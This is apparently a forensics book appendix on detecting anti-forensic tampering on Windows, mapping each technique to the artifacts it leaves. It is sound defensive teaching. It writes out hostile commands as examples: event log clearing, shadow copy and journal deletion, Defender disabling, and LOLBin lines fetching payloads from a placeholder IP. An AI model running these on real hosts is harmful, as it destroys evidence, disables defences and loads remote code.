# Appendix G — Anti-Forensics and Evidence Tampering

This appendix collects in one place the anti-forensic techniques that appear throughout this book: a paragraph on timestomping in Chapter 4, a note about EID 1102 in Chapter 9, a warning about shadow copy deletion in Chapter 12. Open it when the evidence looks wrong: when a directory is emptier than it should be, when a log starts mid-incident, or when a binary claims to have been written in 2009.

The organizing principle: **every anti-forensic action is itself an action, and actions on Windows leave traces.** An attacker who deletes a file must run something to delete it. Something that runs is prefetched, cached, journaled, and, if you are lucky, logged. The destroyed artifact is gone. The destruction usually is not. Most of what follows is the mapping from "what they destroyed" to "what the destruction left behind."

The material is operational rather than comprehensive. It gives you concrete commands, event IDs, registry paths, and detection queries, not an exhaustive taxonomy.

## G.1 The Analyst's Stance Toward Missing Evidence

This is the most important section in the appendix, and it is not about tools.

"Absence of evidence is not evidence of absence" is the phrase everyone knows. It is correct, and it is also frequently misapplied as a reason to stop thinking. Absence of evidence is not *nothing*. It is a finding with its own investigation attached. The question is never "is the artifact missing?" It is **"why is this artifact missing, and which of the four reasons is it?"**

| Reason the artifact is missing | What it means | How you distinguish it |
|---|---|---|
| **Never collected** | The artifact was never captured — the triage collection did not include it, the host was imaged after the fact, the log was not forwarded | Check your own collection scope first. Compare against the KAPE target list or acquisition inventory. This is the most common cause and the least interesting. |
| **Aged out** | The artifact existed and rolled over — log wrapped, Prefetch hit its 1,024-entry ceiling, shadow copies rotated out, MFT record reused | The artifact source still exists and contains *other* records. The oldest record is newer than the event you are looking for. The boundary is consistent across records. |
| **Misconfigured** | The artifact was never generated — audit policy did not include the subcategory, Prefetch is off by default on the server SKU, Script Block Logging was never enabled | Nothing of that *type* exists anywhere in the collection, for any time period, including before the incident. Confirm with `auditpol /get /category:*` and the relevant registry key. |
| **Deliberately destroyed** | Someone removed it | The source exists, contains records on both sides of a gap, and the gap aligns with the incident window. There is usually a second artifact recording the destruction. |

The discipline: **rule these out in order.** Most "the attacker wiped the logs" claims made in the first hour of an incident turn out to be "we collected the wrong thing" or "the default retention is 20 MB." Before you claim anything was destroyed, establish the boundary conditions of your own evidence: what you collected, what the host was configured to record, and how far back each source reaches.

Three questions worth writing into your notes on every case:

1. **What is the natural earliest record for each source on this host?** The oldest event in `Security.evtx`, the oldest Prefetch file, the lowest USN in `$J`, the earliest shadow copy. This is your evidentiary horizon. Anything before it is invisible for reasons that have nothing to do with the attacker.
2. **Is the boundary consistent?** Natural rollover produces a smooth, continuous cutoff. Deletion produces a *hole* — records before and after, nothing in the middle. A hole is the shape of tampering.
3. **Does the gap align with anything?** A gap that starts at the same minute as the first suspicious logon is a very different finding from a gap that starts three weeks earlier.

The complementary discipline: an attacker's cleanup activity is often the **highest-confidence evidence in the entire case**. Ordinary users do not run `vssadmin delete shadows /all /quiet`. Ordinary administrators do not clear the Security log at 03:14 and then reboot. Cleanup actions have low base rates in normal operations, which is exactly what makes them good indicators. When you find one, you have usually found the attacker's timeline anchor.

Two final cautions. First, **do not treat a clean-looking host as an uncompromised host.** A competent attacker with in-memory tooling may leave nothing on disk at all (see G.7).

Second, **do not assume every gap is malicious.** Backup software, disk-cleanup utilities, VDI reprovisioning, imaging processes, and IT decommissioning scripts all destroy artifacts routinely and legitimately. Section G.10 covers how to write about this distinction without overclaiming.

## G.2 Timestamp Manipulation (Timestomping)

Timestomping is the alteration of file timestamps to make attacker files blend into the surrounding file system. The usual method copies the timestamps of a legitimate system file onto a dropped tool. Chapter 4 §4.2.3 introduces the mechanism, and this section covers the detection in operational detail.

### G.2.1 What can and cannot be changed

NTFS stores two independent timestamp sets per file. `$STANDARD_INFORMATION` (`$SI`) is what Explorer, `dir`, and most tools display, and it is writable by any process with a handle to the file. `$FILE_NAME` (`$FN`) lives in the directory index entry, and the file system itself maintains it. There is no user-mode API to set it directly.

That asymmetry is the entire detection. The standard tooling changes `$SI` and cannot touch `$FN`:

```powershell
# The simplest timestomp there is — no tooling required
$f = Get-Item 'C:\Windows\Temp\svchost.exe'
$f.CreationTime   = '2009-07-14 01:14:24'
$f.LastWriteTime  = '2009-07-14 01:14:24'
$f.LastAccessTime = '2009-07-14 01:14:24'
```

Under the hood this is the Win32 `SetFileTime` API (kernel32). Most C2 frameworks' `timestomp` command and the many public `Set-Timestomp` PowerShell scripts call the same API. Meterpreter's `timestomp` module goes further. It uses the native `NtSetInformationFile` path described below to set all four `$SI` values, including the MFT-entry-modified time (its `-e` option). Its `-f` flag copies all timestamps from a reference file. The result is a very convincing `$SI` set and a completely unchanged `$FN` set.

Two refinements matter once you move past the common case. First, `SetFileTime` accepts only creation, last-access, and last-write times, so it leaves the `$SI` **C** (MFT-entry-modified) value at the moment of tampering. The native `NtSetInformationFile` call with `FILE_BASIC_INFORMATION` exposes ChangeTime as well, and tooling built on it sets all four `$SI` values. Second, no API writes `$FN` directly, but a stomp followed by a rename or same-volume move makes NTFS copy the faked `$SI` values into the freshly written `$FN`. That is the double timestomp described in §G.2.2. Neither technique is exotic. Plan your detection around the signals that survive both: the MFT record number, the USN Journal, and the `$LogFile`.

### G.2.2 The signals, in rough order of confidence

| Signal | What it looks like | Confidence |
|---|---|---|
| **`$SI` Created predates `$FN` Created** | A file "created" before its own directory entry existed | High |
| **`$SI` Modified predates `$SI` Created** | Modified before it existed — impossible through normal operation | High |
| **Zeroed sub-second precision** | `2009-07-14 01:14:24.0000000` — NTFS stores 100-nanosecond intervals, so a whole-second value means something wrote the timestamp rather than the file system generating it | Medium — see the caveat below |
| **All four `$SI` timestamps identical** | Created = Modified = Accessed = Changed, to the tick | Medium-high |
| **`$SI` predates the volume's own creation** | File older than the file system it lives on | High |
| **MFT record number inconsistent with claimed age** | A file dated 2009 occupying an MFT record allocated adjacent to files created last Tuesday | Medium-high |
| **USN Journal records creation at the real time** | `$J` shows `FILE_CREATE` at 03:11 for a file whose `$SI` claims 2009 | High |

**The sub-second caveat.** Whole-second timestamps are common and mostly innocent. Any process that *sets* a timestamp rather than letting NTFS generate one can produce them. Sources include archive extraction, `robocopy /COPY:T` and other copy operations that preserve source times, MSI and package installers, files restored from backup, files copied from FAT/exFAT media, and several cloud-sync clients. ZIP stores DOS timestamps at two-second resolution, so files extracted from a ZIP commonly carry `.0000000` on an even second. Treat a whole-second timestamp as a reason to look at the file, not as a finding. It becomes meaningful in three cases: on a file with no plausible extraction or copy provenance, as the *only* whole-second timestamp in a directory of otherwise normal files, or alongside one of the higher-confidence signals above. Reversing that logic, starting from "the timestamp is round, therefore timestomping," generates false positives at a rate that will cost you credibility.

The last two signals matter because they survive the countermeasure. A knowledgeable attacker can defeat the `$SI`/`$FN` comparison with a **double timestomp**: stomp `$SI`, then rename or move the file within the same volume. NTFS then copies the current `$SI` values into the new `$FN` attribute. After that, `$SI` and `$FN` agree — and both are wrong. What the attacker cannot easily fix is the MFT record number, because NTFS allocates records roughly in creation order. Nor can they fix the USN Journal, which recorded the create, the rename, and the `BASIC_INFO_CHANGE` at their real times.

### G.2.3 What a clean detection looks like

Parse the MFT and compare the two attribute sets. `MFTECmd` emits both:

```
MFTECmd.exe -f "C:\Triage\WKSTN-221\$MFT" --csv C:\Cases\WKSTN-221\mft\
```

The relevant columns are `Created0x10` / `Created0x30`, `LastModified0x10` / `LastModified0x30`, `LastRecordChange0x10` / `LastRecordChange0x30`, and `LastAccess0x10` / `LastAccess0x30` — `0x10` is `$SI`, `0x30` is `$FN`.

```powershell
Import-Csv 'C:\Cases\WKSTN-221\mft\20260726_MFTECmd_$MFT_Output.csv' |
  Where-Object { $_.Created0x30 -and
                 ([datetime]$_.Created0x10) -lt ([datetime]$_.Created0x30) } |
  Select-Object ParentPath, FileName, Created0x10, Created0x30 |
  Format-Table -AutoSize
```

Then corroborate against `$J` for the same file:

```
MFTECmd.exe -f "C:\Triage\WKSTN-221\$J" --csv C:\Cases\WKSTN-221\usn\
```

A finished timestomp finding reads: *`C:\Windows\Temp\svchost.exe` carries `$SI` timestamps of 2009-07-14 01:14:24.0000000 across all four values. Its `$FN` Created timestamp is 2026-03-14 03:11:07.4419283. The USN Journal records `FILE_CREATE` for the same MFT reference at 2026-03-14 03:11:07. The file's `$SI` timestamps do not reflect when it was written to this volume.* Three independent sources, one conclusion, no adjectives.

## G.3 Event Log Clearing and Suppression

Log destruction ranges from loud to quiet. The loud end clears the whole log. The quiet end never lets the event be generated in the first place, and it is both more effective and less commonly checked.

### G.3.1 Wholesale clearing

```
wevtutil cl Security
wevtutil cl System
Clear-EventLog -LogName Application
wmic nteventlog where "logfilename='Security'" call cleareventlog
```

Clearing produces its own record, which the clearing process cannot suppress:

| EID | Channel | Meaning |
|---|---|---|
| **1102** | Security | The audit log was cleared — includes `SubjectUserName`, `SubjectDomainName`, `SubjectLogonId` |
| **104** | System | A different log file was cleared — names the channel and the user |
| **1100** | Security | The Event Log service was shut down (normal at shutdown; suspicious mid-day) |
| **1101** | Security | Audit events have been dropped by the transport |
| **1104** | Security | The security log is now full |

EID 1102 is the single highest-value event in this appendix. It carries the account and logon ID of the clearer, which chains directly into the 4624/4672 pair for that logon and from there into the rest of the intrusion. Chapter 9 §9.2.5 covers tampering and clearing. Appendix A covers what to do with the logon ID once you have it.

A Security log that begins abruptly, with EID 1102 as one of its earliest records, is a cleared log. A Security log that begins abruptly with *no* 1102 is either a rollover or something more interesting — see below.

### G.3.2 Selective record deletion

Some tools remove individual records from a live `.evtx` rather than clearing the whole channel. Examples include the DanderSpritz `eventlogedit` family and various public reimplementations. A related in-memory approach kills the Event Log service's worker threads so records are never written at all. These techniques leave no 1102, which is the point.

The detection is **EventRecordID sequence analysis**. Records in a channel are numbered monotonically as they are written. Removing a record from the file leaves a hole in the numbering that the file format does not repair:

```powershell
$r = Get-WinEvent -Path 'C:\Triage\WKSTN-221\Logs\Security.evtx' -Oldest |
     Select-Object RecordId, TimeCreated
for ($i = 1; $i -lt $r.Count; $i++) {
    if ($r[$i].RecordId -ne ($r[$i-1].RecordId + 1)) {
        '{0} -> {1}  ({2} missing)  at {3}' -f $r[$i-1].RecordId,
            $r[$i].RecordId, ($r[$i].RecordId - $r[$i-1].RecordId - 1),
            $r[$i].TimeCreated
    }
}
```

Interpretation caveats that keep this finding defensible:

- A log that has wrapped starts at a high RecordId. That is not a gap. A *first* record number greater than 1 is normal.
- Exported or filtered `.evtx` subsets legitimately contain non-contiguous RecordIds. Confirm you are looking at a live channel file, not an export.
- Chunk-level corruption from an unclean shutdown can produce unreadable regions. `EvtxECmd` reports parse errors. Distinguish "unreadable" from "absent."

A gap of a few dozen records, spanning exactly the incident window, in an otherwise contiguous log, with no 1102 present, is a strong tampering indicator. Pair it with a forwarded copy of the same channel from the SIEM or a Windows Event Forwarding collector. Those copies were written elsewhere and are usually intact.

### G.3.3 Suppression: stopping the record from ever existing

Quieter and more common than deletion:

```
auditpol /clear                                  # wipe the local audit policy entirely
auditpol /set /subcategory:"Process Creation" /success:disable
wevtutil sl Security /ms:1052672                 # shrink Security to ~1 MB to force rapid rollover
wevtutil sl Microsoft-Windows-PowerShell/Operational /e:false   # disable the channel
sc config EventLog start= disabled
```

What suppression leaves behind:

| Action | Residue |
|---|---|
| `auditpol` policy change | Security EID **4719** (system audit policy changed), EID **4907** (object auditing settings changed) |
| Log size / retention change | `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\<Channel>\MaxSize` and `Retention` — the key's LastWriteTime dates the change |
| Channel disabled | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\<Channel>\Enabled = 0` |
| Sysmon unloaded (`sysmon -u`) | Sysmon EID **255** (error), System EID **7036/7040** for the service, driver `SysmonDrv` removal in the SYSTEM hive; see Appendix C |
| Defender tampering | `Microsoft-Windows-Windows Defender/Operational` EID **5001** (real-time protection disabled), **5007** (configuration changed), **5010/5012** (scanning disabled) |
| Event Log service stopped | Security EID **1100**, System EID **7036** |

The registry LastWriteTime is the workhorse here. A `WINEVT\Channels\Microsoft-Windows-PowerShell/Operational` key with a LastWriteTime of 03:09 on the morning of the incident tells you when logging was turned off, even though the disabling itself generated no event.

**Cleared does not always mean gone.** Look for the pre-clearing content in Volume Shadow Copies of `C:\Windows\System32\winevt\Logs\`, in SIEM or WEF-forwarded copies, and in backup images. You can also carve it with [EVTXtract](https://github.com/williballenthin/EVTXtract) out of unallocated space, the pagefile, or a memory image. The Event Log service holds recent records in memory, so a capture taken before reboot frequently contains records that no longer exist on disk (Chapter 7).

## G.4 Volume Shadow Copy Destruction

Deleting shadow copies is the closest thing Windows IR has to a universal precursor. It appears in essentially every ransomware playbook, because encrypting files is pointless if the victim can restore them from a snapshot 10 minutes later. Chapter 12 covers the ransomware case in full, and this section covers the artifact side.

### G.4.1 The commands

```
vssadmin.exe delete shadows /all /quiet
wmic.exe shadowcopy delete /nointeractive
Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB
wbadmin.exe delete catalog -quiet
bcdedit.exe /set {default} recoveryenabled No
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
```

The `resize shadowstorage` variant is worth knowing because it is quieter. Shrinking the shadow storage area to a small value makes Windows delete existing snapshots *itself* to fit the new limit, so the deletions look like routine space management. The tell is the `bcdedit`-style pairing: a `vssadmin resize` immediately followed by recovery-option tampering is not space management.

`bcdedit` changes are not shadow-copy deletion at all, but they travel with it. They disable Windows Recovery Environment and automatic repair so the victim cannot boot into recovery. Treat shadow-copy deletion, backup-catalog deletion, and recovery-option tampering as one behavioral cluster.

### G.4.2 What it leaves

| Artifact | What you get |
|---|---|
| **Security EID 4688** | Process creation with full command line — requires `Audit Process Creation` plus `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled = 1` |
| **Sysmon EID 1** | Command line, parent process, hashes, user — the best version of this evidence if Sysmon is deployed (Appendix C) |
| **Prefetch** | `VSSADMIN.EXE-*.pf`, `WMIC.EXE-*.pf`, `BCDEDIT.EXE-*.pf`, `WBADMIN.EXE-*.pf` with last-run times and run counts (Chapter 6) |
| **System log, source `volsnap`, EID 25** | Shadow copies on a volume are gone. The event text attributes this to shadow storage failing to grow, and it fires on healthy systems under write load. It corroborates the outcome and never proves that a deletion command ran. Pair it with `VSSADMIN.EXE` Prefetch or a 4688 |
| **System EID 7036** | Volume Shadow Copy service entered the running state, immediately before the deletion |
| **Application log, source VSS** | Various operational errors and shutdown events around the activity window |
| **`$MFT` / `$J`** | Deletion of the snapshot store contents under `\System Volume Information\` |

At analysis time, establish the current state with `vssadmin list shadows` (elevated) and check whether System Restore was disabled outright at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore\DisableSR = 1`.

Shadow copies are also one of the best *sources* of pre-tampering state: registry hives, event logs, and files as they existed before the attacker touched them. Destroying them attacks your recovery options and your evidence at the same time. That is why finding them intact on a compromised host is such a productive moment. Check for them early, before anything on the host changes.

## G.5 Prefetch, Journal, and Artifact Disabling

Rather than delete individual artifacts, an attacker can turn the mechanism off. This is more thorough and, usefully for you, harder to do quietly.

### G.5.1 Prefetch

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
del /q C:\Windows\Prefetch\*.pf
sc config SysMain start= disabled
```

`EnablePrefetcher` values: `0` disabled, `1` application prefetch, `2` boot prefetch, `3` both (the workstation default). Prefetch is disabled by default on Windows Server SKUs, so check the value before treating an empty Prefetch directory as tampering. This is the classic "misconfigured versus destroyed" trap from G.1.

Residue: the `PrefetchParameters` key's LastWriteTime dates the change precisely. Bulk `.pf` deletion floods `$J` with `FILE_DELETE` / `CLOSE` records in a tight cluster. The `$MFT` retains unallocated records for the deleted `.pf` files, often with their names and timestamps intact. Sysmon EID 13 (registry value set) and EID 23 (file delete, when configured for archival) capture both halves.

### G.5.2 USN Journal

```
fsutil usn deletejournal /d /n C:
fsutil usn createjournal m=0x800000 a=0x100000 C:
```

Deleting the journal destroys the file-system change history, which is often the most valuable timeline source on the host. The replacement journal, however, is obviously new:

```
fsutil usn queryjournal C:
```

A journal whose `Journal ID` was created hours ago on a host with 400 days of uptime, or whose `First USN` is at or near zero, is a deleted-and-recreated journal. Corroborate with `FSUTIL.EXE-*.pf` in Prefetch, EID 4688 / Sysmon EID 1 for the `fsutil` invocation, and the `$Extend\$UsnJrnl:$J` file's own `$SI`/`$FN` timestamps in the MFT.

### G.5.3 Amcache, ShimCache, and the compatibility infrastructure

```
del C:\Windows\AppCompat\Programs\Amcache.hve
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\AppCompat" /v DisableInventory /t REG_DWORD /d 1 /f
schtasks /Change /TN "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /DISABLE
```

Residue: scheduled-task modification generates Security EID 4701 (task disabled) and 4702 (task updated), plus entries under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\`. Deleting `Amcache.hve` leaves the `Amcache.hve.LOG1` / `.LOG2` transaction logs behind. They frequently contain recent entries the attacker did not think to remove. ShimCache (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache`) is only flushed to the registry at shutdown, so clearing the value on a running host does not remove what is still resident in memory. That is another argument for capturing memory before rebooting anything.

### G.5.4 The general principle

Every one of these is a configuration change, and Windows records configuration changes in ways that are hard to reach:

- The **registry key's LastWriteTime** dates the change even when the value itself is now unremarkable.
- The **hive transaction logs** (`.LOG1` / `.LOG2`) may still hold the pre-change page.
- The **shadow copy** taken before the change holds the original hive.
- The **USN Journal** records the hive write itself.
- **Sysmon EID 12/13/14** and EDR telemetry record the change as it happens, off-host (Appendix C).

Disabling an artifact source is loud in proportion to how thorough it is. An attacker who disables Prefetch, deletes the USN Journal, and clears Amcache has produced three high-confidence indicators in exchange for removing three sources. That is usually a bad trade for them and a good one for you.

## G.6 Secure Deletion and Wiping

Ordinary deletion leaves the data recoverable and the metadata intact. Secure deletion overwrites the content, but it is the noisiest technique in this appendix. The wiping tool has to *run*, and execution evidence is far more durable than file content.

### G.6.1 The tools

| Tool | Typical invocation | Scope |
|---|---|---|
| **SDelete** (Sysinternals) | `sdelete.exe -p 3 -s -z C:\Users\Public\tools` | Files, directories, or free space |
| **cipher** (built in) | `cipher /w:C:\` | Free space on a volume only |
| **BleachBit** | `bleachbit.exe --clean --overwrite system.tmp` | Application and system traces |
| **Eraser** | GUI / scheduled task | Files, free space |
| **Full-disk wipe** (DBAN, `diskpart clean all`, vendor secure-erase) | Boot media or `diskpart` | Entire device |

### G.6.2 Why wiping is loud

The execution evidence for the wiping tool is almost always more findable than the wiped data:

- **SDelete writes a EULA acceptance value to the registry**: `HKCU\Software\Sysinternals\SDelete\EulaAccepted = 1`. This is one of the cleanest single artifacts in the appendix. Every Sysinternals tool does this, under `HKCU\Software\Sysinternals\<ToolName>`, and the value is per-user, which attributes the execution to an account.
- **`cipher /w` creates a working directory** named `EFSTMPWP` in the root of the target volume while it runs, then removes it. The MFT and USN Journal retain the record of that directory's creation and deletion long after.
- **Prefetch** (`SDELETE.EXE-*.pf`, `CIPHER.EXE-*.pf`, `BLEACHBIT.EXE-*.pf`) records last-run times, run count, and the volume the tool touched.
- **Amcache and ShimCache** record the binary's path, size, and SHA-1 (Amcache) even if the executable itself was later deleted.
- **SRUM** (`C:\Windows\System32\SRU\SRUDB.dat`, parsed with `SrumECmd`) records per-application CPU and I/O. A wiping run against free space shows up as a large, distinctive I/O profile with a timestamp.
- **The `$MFT` and `$J`** record the wipe's effect: a burst of `DATA_OVERWRITE`, `FILE_DELETE`, and `CLOSE` records, and unallocated MFT records that retain the *names and timestamps* of the wiped files even though the content is gone. Knowing a file named `exfil-finance-q3.7z` existed at 02:58 is frequently more valuable than its contents.

### G.6.3 File-level versus full-disk

| | File-level wipe | Full-disk wipe |
|---|---|---|
| **Destroys** | Content of specific files | Everything, including the metadata trail |
| **Leaves on the host** | MFT records, USN entries, Prefetch, Amcache, SRUM, registry residue | Nothing in the file system. Areas outside the addressed LBA range are a different question — see below |
| **Leaves off the host** | EDR / SIEM telemetry | EDR / SIEM telemetry, the abrupt end of it, and the boot-media or reimaging event |
| **Detection posture** | Rich; the wipe is usually reconstructable in outline | Pivot entirely to network, domain, and EDR-side evidence (Appendix A, Appendix C) |
| **Operational cost to attacker** | Low, fast, targeted | Very high — requires reboot, physical or out-of-band access, and destroys their own access |

Full-disk wipes are rare outside destructive attacks and insider cases precisely because they cost the attacker their foothold. When you do encounter one, the host is a dead end and the investigation moves to the domain controller, the proxy and flow records (Chapter 8), and the EDR backend.

"Nothing" in that table means nothing a normal acquisition will surface, and that is not the same as nothing at all. A software wipe writes to the sectors the drive reports as addressable, and several regions sit outside that:

- **HPA and DCO** (host protected area, device configuration overlay) on ATA drives are ranges the drive hides from the OS. A wipe run from Windows will not touch them. Most modern imagers detect and unlock both. Check whether yours did, and whether the reported sector count matches the drive's native capacity.
- **SSD over-provisioning and remapped blocks.** Flash controllers write to physical pages the host cannot address directly and retire blocks as they wear. Data that lived in a retired or over-provisioned block is not reachable by writing to its logical address. Recovering it means chip-off or vendor-level access — expensive, rarely proportionate, but it exists.
- **Service and diagnostic areas**, and on some drives a residual sector or two beyond the partition table.

None of this makes a full-disk wipe recoverable in practice. The point is narrower, and it matters in a report: write *"no data was recoverable by the methods applied"*, not *"the disk was securely erased."* The second is a claim about the physical medium that you did not test.

On SSDs with TRIM enabled, deleted content is frequently unrecoverable whether or not anyone wiped it. Do not present the absence of recoverable content as evidence of wiping on an SSD. The execution artifacts for the wiping tool are what carry that finding.

## G.7 Living off the Land and Tool Removal

The most effective anti-forensic strategy is never generating evidence at all, rather than destroying it. Three variants follow, in increasing order of difficulty for you.

### G.7.1 Living off the land (LOLBins)

Using signed, Microsoft-supplied binaries already on the host means no new file to detect, no unsigned binary to flag, and no obvious "attacker tool" in Prefetch. The catalogue is the [LOLBAS project](https://lolbas-project.github.io/). Recurring examples:

```
certutil.exe -urlcache -split -f http://198.51.100.20/a.txt C:\Users\Public\a.exe
bitsadmin.exe /transfer j /download http://198.51.100.20/a.exe C:\Users\Public\a.exe
mshta.exe http://198.51.100.20/x.hta
regsvr32.exe /s /u /i:http://198.51.100.20/x.sct scrobj.dll
rundll32.exe C:\Users\Public\a.dll,Start
msiexec.exe /q /i http://198.51.100.20/x.msi
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...
```

What they leave anyway:

| Binary | Residue beyond the usual 4688 / Sysmon EID 1 |
|---|---|
| `certutil.exe` | Downloaded content cached under `%LOCALAPPDATA%\Microsoft\Windows\INetCache\`; the URL cache directory persists after the fetch |
| `bitsadmin.exe` / BITS | `Microsoft-Windows-Bits-Client/Operational` EIDs **3**, **59**, **60**, **16403**; the job database at `%ALLUSERSPROFILE%\Microsoft\Network\Downloader\qmgr.db` |
| `mshta.exe`, `regsvr32.exe` | Prefetch entries; `HKCU` MUICache and shell artifacts; network connection records via Sysmon EID 3 |
| `powershell.exe` | `Microsoft-Windows-PowerShell/Operational` EID **4104** (script block, logged at Warning level for suspicious blocks even without full Script Block Logging enabled); EID **400/403/600** in the *classic* `Windows PowerShell` channel, not the Operational one; `ConsoleHost_history.txt` under `%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\` |
| Any of them | Amcache, ShimCache, SRUM, and the Prefetch run count — a system binary with an anomalous *run count* or a first-execution timestamp inside the incident window is itself a finding |

The analytical shift LOLBins force is from *what ran* to *what ran that should not have, in this context*. `certutil.exe` on a domain controller is normal. `certutil.exe` invoked by `winword.exe` on a finance workstation at 03:14 with a URL argument is not. Parent-process and command-line context are the detection. That is why command-line auditing and Sysmon are worth the deployment effort.

### G.7.2 Tool removal after use

Attackers routinely delete their tooling once it has served its purpose. What survives the deletion:

- The **MFT record** (frequently unallocated but intact, with name, path, size, and both timestamp sets)
- **USN Journal** entries for the create, the writes, and the delete — with real times
- The **Prefetch file**, which outlives the executable and records up to eight last-run times, the run count, the volume serial number, and the list of files and directories the tool touched during its first 10 seconds
- **Amcache** entries with the SHA-1 of the deleted binary — enough to hash-match against threat intel or against a copy recovered elsewhere
- **ShimCache, SRUM, jump lists, and LNK files** if it was launched interactively (Chapter 6)
- **Shadow copies** predating the deletion, which may hold the binary itself

Recovering a deleted attacker tool's SHA-1 from Amcache and matching it to a public sample is a standard and frequently decisive move.

### G.7.3 In-memory-only execution

The hardest case: reflectively loaded assemblies, process injection, fileless C2 stagers, and PowerShell that never writes to disk. There may be no file-system artifact at all.

This is where Chapter 7 becomes non-optional. If the host is still running, **capture memory before doing anything else** — before rebooting, before isolating in a way that triggers a reboot, before running your triage collection. Once the host is powered off, in-memory-only tooling is gone.

In the image, the standard first passes (Chapter 7, Appendix D):

```
vol.py -f WEB-APP-03_memory.raw windows.malfind
vol.py -f WEB-APP-03_memory.raw windows.pslist
vol.py -f WEB-APP-03_memory.raw windows.psscan          # unlinked / hidden processes
vol.py -f WEB-APP-03_memory.raw windows.cmdline
vol.py -f WEB-APP-03_memory.raw windows.netscan
vol.py -f WEB-APP-03_memory.raw windows.dlllist
```

`malfind` looks for executable memory regions with no backing file on disk — the structural signature of injected or reflectively loaded code. A `pslist` / `psscan` diff surfaces processes unlinked from the active process list. See Appendix A for what in-memory loaders look like in a lateral-movement chain, and Appendix C for the EDR-side telemetry that often catches the load even when the host has nothing.

### G.7.4 Defensive-tooling tampering

Attackers frequently disable the thing that would have recorded them.

```
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath 'C:\Users\Public'
sc stop <edr-service> && sc config <edr-service> start= disabled
```

Defender exclusion paths are a particularly durable artifact. They persist in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths` and in `Set-MpPreference` policy. An exclusion for the exact directory the attacker later used is close to a confession. Bring-your-own-vulnerable-driver (BYOVD) attacks that kill EDR from the kernel leave a driver load: System EID 7045 for the service, Sysmon EID 6 for the driver load, and the driver file itself in `C:\Windows\System32\drivers\`.

## G.8 Registry and Persistence Cleanup

An attacker who establishes persistence and later removes it leaves a distinctive residue, because the registry is unusually bad at forgetting.

### G.8.1 What gets cleaned

| Persistence mechanism | Removal | Where residue survives |
|---|---|---|
| Run / RunOnce keys | `reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /f` | Parent key LastWriteTime; unallocated hive cells; `.LOG1`/`.LOG2`; shadow copies |
| Services | `sc delete <name>` | System EID **7045** recorded the install; `Services` key LastWriteTime; the *other* control set in the SYSTEM hive may retain the stale entry |
| Scheduled tasks | `schtasks /Delete /TN <name> /F` | Security EID **4698** (created) / **4699** (deleted); `Microsoft-Windows-TaskScheduler/Operational` EID **141**; the XML under `C:\Windows\System32\Tasks\` in the MFT |
| WMI event subscriptions | `Remove-WmiObject` on the filter/consumer/binding | `Microsoft-Windows-WMI-Activity/Operational` EID **5859/5860/5861**; `OBJECTS.DATA` under `C:\Windows\System32\wbem\Repository\` |
| Winlogon `Shell` / `Userinit`, IFEO | `reg delete` / value restore | Key LastWriteTime; transaction logs; shadow copies |

### G.8.2 Why the residue survives

Four mechanisms, worth understanding because they generalize:

1. **Deleted cells are not zeroed.** The registry hive is a cell-allocated structure. Deleting a key or value marks its cell free but leaves the bytes until reused. Registry Explorer surfaces these directly as *deleted records*, complete with names, data, and in many cases timestamps. `yarp` and RegRipper have equivalents. Analysts routinely recover deleted `Run` values from unallocated hive space.
2. **Transaction logs lag the hive.** `.LOG1` and `.LOG2` hold dirty pages not yet flushed to the primary hive. Registry Explorer replays them on load. That sometimes reveals a value that exists in the log but no longer in the hive: the pre-deletion state, preserved by accident. Always collect the transaction logs alongside the hive. A hive collected without its logs is an incomplete artifact.
3. **The parent key's LastWriteTime updates on deletion.** Deleting a value updates the containing key's timestamp. You lose the value, but you keep the minute it was removed. A `Run` key whose LastWriteTime is 03:22 on the day of the incident, containing nothing unusual, is a finding.
4. **Prior copies exist.** Shadow copies (G.4), `C:\Windows\System32\config\RegBack`, and any backup image predating the cleanup all hold the original hive. Since Windows 10 1803, `RegBack` is empty by default unless `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager\EnablePeriodicBackup = 1`. Chapter 5 §5.1.5 covers pulling hives out of shadow copies.

When you suspect persistence was established and removed, **compare a shadow-copy hive against the live hive** and run Registry Explorer's deleted-record recovery over both. That combination recovers removed persistence in a large fraction of cases.

## G.9 Detection Summary Table

The dense version. Confidence reflects how strongly the *catching artifact* supports a tampering conclusion on its own, before corroboration.

| Technique | What it destroys | What it leaves behind | Artifact that catches it | Confidence |
|---|---|---|---|---|
| **Timestomping (`$SI` only)** | Apparent file age | Unchanged `$FN`; zeroed sub-second precision | `$MFT` `$SI`/`$FN` comparison (MFTECmd `Created0x10` vs `Created0x30`) | High |
| **Double timestomp (`$SI` + rename)** | Both timestamp sets | Real times in the journal; MFT record allocation order | USN Journal `$J`; MFT record number vs. neighbours | Medium-high |
| **`wevtutil cl` / `Clear-EventLog`** | All records in a channel | The clearing event itself, with account and logon ID | Security EID **1102**; System EID **104** | High |
| **Selective record deletion** | Individual records | Holes in the record numbering | EventRecordID sequence gap; forwarded / SIEM copy | Medium-high |
| **`auditpol /clear` or subcategory disable** | Future events | Policy-change event; audit policy state | Security EID **4719**, **4907**; `auditpol /get /category:*` | High |
| **Log size reduction to force rollover** | Older records | Registry value + key LastWriteTime | `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\<Ch>\MaxSize` | Medium |
| **Channel disabled (`wevtutil sl /e:false`)** | Future events | Registry state and key timestamp | `WINEVT\Channels\<Ch>\Enabled = 0` | Medium-high |
